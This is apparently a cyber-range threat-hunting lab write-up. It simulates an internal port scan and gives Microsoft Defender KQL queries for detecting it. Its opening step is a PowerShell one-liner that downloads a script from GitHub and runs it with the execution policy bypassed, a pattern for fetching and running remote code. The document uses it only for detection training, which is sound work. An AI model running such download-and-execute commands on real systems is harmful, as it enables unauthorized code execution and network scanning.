# Threat Event (Sudden-Network-Slowdown)
**Use of Powershell to run "Malicious" script**

## Steps the "Bad Actor" took Create Logs and IoCs:
1. Execute the following code in Powershell:
- `Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1`

## What this script does:
- `portscan.ps1` is a PowerShell script designed to simulate a malicious actor performing a port scan, intended for cybersecurity training and detection testing. It demonstrates how an attacker might probe for open ports to identify potential vulnerabilities within a network. This script is meant to be used in controlled environments only.

---

## Tables Used to Detect IoCs:

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name** | DeviceNetworkEvents |
| **Info** | [DeviceNetworkEvents Documentation](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table) |
| **Purpose** | Used to detect internal port scanning activity by identifying a high volume of connection attempts from the same host. |

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name** | DeviceProcessEvents |
| **Info** | [DeviceProcessEvents Documentation](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table) |
| **Purpose** | Used to identify suspicious PowerShell activity, including the execution of `portscan.ps1` using bypassed execution policy, and the parent-child relationship of involved processes. |

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name** | DeviceLogonEvents |
| **Info** | [DeviceLogonEvents Documentation](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicelogonevents-table) |
| **Purpose** | Used to confirm the interactive login of user prior to execution of the port scanning script. |



---

## Related Queries:
```kql
//Look for failed connections to determine cause of network slowdown
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| summarize FailedConnectionAttempts = count() by DeviceName, ActionType, LocalIP, RemoteIP
| order by FailedConnectionAttempts desc


//Look for cause of portscan
let SpecificTime = datetime(2025-04-20T13:12:29.9031119Z);
DeviceProcessEvents
| where DeviceName == "edr-machine"
| where Timestamp between ((SpecificTime - 1m) .. (SpecificTime + 1m))
| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine, FolderPath
| sort by Timestamp asc

//Instances of Powershell for chain of execution
let SpecificTime = datetime(2025-04-20T13:12:29.9031119Z);
DeviceProcessEvents
| where DeviceName == "edr-machine"
| where FileName == "powershell.exe"
| where Timestamp between ((SpecificTime - 1m) .. (SpecificTime + 1m))
| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine, FolderPath, InitiatingProcessParentFileName, LogonId
| sort by Timestamp asc

//Use Logon events to determine if a user initiated the portscan
let SpecificTime = datetime(2025-04-20T13:12:29.9031119Z);
DeviceLogonEvents
| where DeviceName == "edr-machine"
| where Timestamp between ((SpecificTime - 1m) .. (SpecificTime + 1m))
| project Timestamp, ActionType, LogonType, AccountDomain, AccountName
| where ActionType == "LogonSuccess"
| sort by Timestamp desc

//Verify an interactive login session
DeviceProcessEvents
| where DeviceName == "edr-machine"
| where Timestamp between (datetime(2025-04-20T13:11:00Z) .. datetime(2025-04-20T13:13:00Z))
| where FileName == "explorer.exe" or FileName == "powershell.exe"
| project Timestamp, AccountDomain, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessParentFileName, AccountName
| sort by Timestamp desc

```

---

## Created By:
- **Author Name**: Jordan West
- **Author Contact**: https://www.linkedin.com/in/jordan-west-it/
- **Date**: April 16, 2025

## Validated By:
- **Reviewer Name**: 
- **Reviewer Contact**: 
- **Validation Date**: 

---

## Additional Notes:
- **None**

---

## Revision History:
| **Version** | **Changes**                   | **Date**         | **Modified By**   |
|-------------|-------------------------------|------------------|-------------------|
| 1.0         | Initial Draft                 |`September 6, 2024`| `Josh Madakor` |
| 2.0         | Updated draft                 | `April 21, 2025`  | `Jordan West`   |

